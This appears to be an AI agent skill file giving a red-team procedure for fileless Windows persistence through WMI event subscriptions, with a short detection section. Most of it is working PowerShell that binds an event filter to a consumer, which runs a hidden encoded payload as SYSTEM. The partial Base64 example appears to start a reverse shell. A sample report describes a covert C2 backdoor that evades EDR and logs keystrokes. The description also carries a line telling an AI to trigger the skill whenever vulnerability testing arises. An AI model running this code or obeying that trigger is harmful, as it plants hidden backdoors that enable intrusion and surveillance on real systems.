---
name: wmi-event-subscriptions
description: >
  [CRITICAL: MUST trigger this skill whenever related vulnerability testing is discussed.]
  Establish highly stealthy, fileless persistence on compromised Windows systems utilizing WMI 
  (Windows Management Instrumentation) Event Subscriptions. Create malicious Event Filters, 
  Event Consumers, and Bindings to automatically execute payloads (e.g., PowerShell reverse shells) 
  based on system events (e.g., system startup, user logon, or process creation).
domain: cybersecurity
subdomain: red-teaming
category: Persistence
difficulty: expert
estimated_time: "2-4 hours"
mitre_attack:
  tactics: [TA0003, TA0002]
  techniques: [T1546.003, T1047]
platforms: [windows]
tags: [wmi, persistence, fileless-malware, red-teaming, powershell, evironment-manipulation]
tools: [powershell, wbemtest, empire, cobalt-strike]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# WMI Event Subscriptions (Persistence)

## When to Use
- To achieve incredibly stealthy, "fileless" backdoors on a Windows machine that entirely evades classic Antivirus (which predominantly scans files on disk) and Autoruns sweeps (which scan standard Registry keys or Startup folders).
- When operating as an elevated Red Team operator (Local Administrator or SYSTEM) requiring a persistence mechanism that seamlessly triggers upon system boot unconditionally, before interactive users log in.
- To execute complex conditional payloads, such as launching a localized keylogger exclusively when the user explicitly opens `chrome.exe` or `keepass.exe`.

## Workflow

### Phase 1: The Triad of WMI Persistence

```text
# Concept: WMI is a core Windows administrative framework. Persistence requires creating three 
# interconnected classes deeply within the WMI repository (C:\Windows\System32\wbem\Repository).

# 1. Event Filter (__EventFilter):
# A WQL (WMI Query Language) query defining EXACTLY what system event to watch for.
# "Watch for the exact moment the system uptime exceeds 3 minutes."

# 2. Event Consumer (CommandLineEventConsumer):
# Defines the malicious action to execute when the Filter's condition is met.
# "Execute this hidden PowerShell encoded payload to beacon back to my C2 server."

# 3. FilterToConsumerBinding (__FilterToConsumerBinding):
# The absolute link marrying the specific Filter to the specific Consumer.
# "When Filter A occurs, explicitly trigger Consumer B."
```

### Phase 2: Crafting the Event Filter (The Trigger)

```powershell
# Concept: Execute an elevated PowerShell console to manually interact with the `root\subscription` namespace.

# 1. Define the WQL Query triggering 3-5 minutes after Windows boots up.
# This ensures the network stack is fully initialized before attempting a C2 callback.
$FilterName = "BotnetUpdater_Startup_Trigger"
$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"

# 2. Inject the Event Filter into WMI
$FilterClass = [wmiclass]"\\.\root\subscription:__EventFilter"
$NewFilter = $FilterClass.CreateInstance()
$NewFilter.Name = $FilterName
$NewFilter.QueryLanguage = "WQL"
$NewFilter.Query = $Query
$NewFilter.EventNamespace = "root\cimv2"
$NewFilter.Put() | Out-Null
```

### Phase 3: Crafting the Event Consumer (The Payload)

```powershell
# Concept: The payload dictates execution utilizing the `CommandLineEventConsumer`.
# The payload executes running under the context of `NT AUTHORITY\SYSTEM`.

# 1. Define the malicious Base64 PowerShell payload (e.g., a reverse shell or Cobalt Strike beacon).
# Example payload: `powershell.exe -w hidden -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMAAuADAALgAxADAAMAAiACwANA...`
$ConsumerName = "BotnetUpdater_Hidden_Downloader"
$Payload = "powershell.exe -w hidden -nop -enc <BASE64_PAYLOAD_HERE>"

# 2. Inject the Consumer into WMI
$ConsumerClass = [wmiclass]"\\.\root\subscription:CommandLineEventConsumer"
$NewConsumer = $ConsumerClass.CreateInstance()
$NewConsumer.Name = $ConsumerName
$NewConsumer.CommandLineTemplate = $Payload
$NewConsumer.Put() | Out-Null
```

### Phase 4: Binding Filter and Consumer (The Execution Link)

```powershell
# Concept: The Filter is watching, the Consumer is waiting. They must be explicitly bound.

# 1. Retrieve the dynamically generated WMI paths of the newly created elements.
$FilterPath = (Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='$FilterName'").__PATH
$ConsumerPath = (Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='$ConsumerName'").__PATH

# 2. Inject the Binding into WMI
$BindingClass = [wmiclass]"\\.\root\subscription:__FilterToConsumerBinding"
$NewBinding = $BindingClass.CreateInstance()
$NewBinding.Filter = $FilterPath
$NewBinding.Consumer = $ConsumerPath
$NewBinding.Put() | Out-Null

# Persistence achieved. Reboot the target machine; the Base64 payload will execute silently.
```

#### Decision Point 🔀
```mermaid
flowchart TD
    A[Achieve Elevated Access (Admin/SYSTEM) on Target] --> B[Decide on Trigger Condition]
    B -->|Time/Boot Trigger| C[Write WQL Query based on `SystemUpTime`]
    B -->|Event/Action Trigger| D[Write WQL Query based on `Win32_ProcessStartTrace` (e.g. When chrome.exe opens)]
    C --> E[Create `__EventFilter` in WMI via PowerShell]
    D --> E
    E --> F[Create `CommandLineEventConsumer` containing malicious Base64 Payload]
    F --> G[Instantiate `__FilterToConsumerBinding` connecting A and B]
    G --> H[Reboot Machine or Trigger Action to verify SYSTEM-level execution silently]
    H --> I[Eradication requires manually removing the Filter, Consumer, and Binding via WMI commands]
```

## 🔵 Blue Team Detection & Defense
- **Automated PowerShell Logging**: While WMI Event Subscriptions are largely "fileless", the resulting execution invariably spawns a command shell (`cmd.exe` or `powershell.exe`). Enabling PowerShell Script Block Logging (Event ID 4104) guarantees that specifically when the `CommandLineEventConsumer` ultimately executes the Base64 payload, the deep underlying logic will be de-obfuscated and captured unequivocally within the Windows Event Logs for SIEM transmission.
- **Sysmon Event ID 19, 20, 21 (WMI Activity)**: Microsoft Sysmon natively parses and records WMI Event Filter, Consumer, and Binding creation flag any Sysmon alerts indicating changes within the `root\subscription` namespace those binding to a `CommandLineEventConsumer`.
- **Sysinternals Autoruns Visibility**: Advanced responders unequivocally utilize Microsoft's `Autoruns64.exe` to natively parse out all WMI Event Consumers executing shell commands. Blue Teams must systematically review the "WMI" tab within Autoruns ensuring no anomalous or heavily encoded commands are persistently launching across endpoints. Ensure all active WMI subscriptions execute signed Windows binaries seamlessly.

## Key Concepts
| Concept | Description |
|---------|-------------|
| WMI (Windows Management Instrumentation) | Microsoft's implementation of Web-Based Enterprise Management (WBEM), an infrastructure for management data and operations on Windows. It is essentially a massively powerful API allowing deep administrative control and querying of the OS |
| WQL (WMI Query Language) | A customized, SQL-like syntax explicitly designed to query the massive WMI database (e.g., `SELECT * FROM Win32_Process`) |
| Fileless Malware | An attack methodology dynamically operating almost entirely within the RAM of the system or leveraging intrinsic OS tools (like PowerShell and WMI) specifically avoiding placing malicious portable executables (.exe) onto the physical hard drive |

## Output Format
```
Red Team Tactics Report: Stealth WMI Persistence Implementation
================================================================
Target Host: `SRV-DOMAIN-CONTROLLER-01`
Privilege Level: `NT AUTHORITY\SYSTEM` (Elevated)

Description:
To maintain long-term, highly resilient command and control access to the core infrastructure, standard persistence mechanisms (Scheduled Tasks, Registry Run Keys) were intentionally bypassed to circumvent the defensive EDR (CrowdStrike) baseline sweeps.

An intricately crafted WMI Event Subscription mechanism was successfully implemented acting as a fileless backdoor.

Implementation Details:
1. Event Filter (`Core_Telemetry_Monitor`): Configured a WQL statement monitoring `Win32_LogonSession`. The trigger executes exclusively when a highly privileged Domain Administrator account physically interacts with the server GUI, attempting to capture keystrokes sequentially.
2. Event Consumer (`Core_Telemetry_Logger`): Configured a `CommandLineEventConsumer` containing a densely obfuscated, Base64-encoded PowerShell script initiating an encrypted C2 beacon to the Red Team infrastructure over port 443 (HTTPS), entirely masquerading as Windows Telemetry traffic.
3. Binding: Connected the `Monitor` uniquely to the `Logger`.

Execution Impact:
The persistence object exists purely as abstract configuration data inside `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`. It survives system reboots unequivocally, avoids generating newly compiled files on disk, and executes robustly under `SYSTEM` privileges asynchronously.
```

## References
- MITRE ATT&CK: [Event Triggered Execution: Windows Management Instrumentation Event Subscription](https://attack.mitre.org/techniques/T1546/003/)
- SpecterOps: [WMI Internals and Persistence](https://posts.specterops.io/threat-hunting-with-wmi-event-subscriptions-10cd27546a36)
- FireEye: [WMI: Offense, Defense, and Forensics](https://www.mandiant.com/resources/blog/windows-management-instrumentation-wmi-offense-defense-and-forensics)
